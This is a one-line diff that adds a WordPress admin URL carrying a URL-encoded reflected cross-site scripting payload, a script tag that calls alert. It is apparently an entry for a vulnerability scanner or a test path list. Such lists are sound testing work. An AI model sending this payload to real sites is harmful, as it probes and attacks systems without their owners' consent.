@@ -1,0 +1,1 @@
+/wp-admin/admin.php?page=Accessibility&%22%3E%3Cscript%3Ealert%28%22document_domain%22%29%3C/script%3E
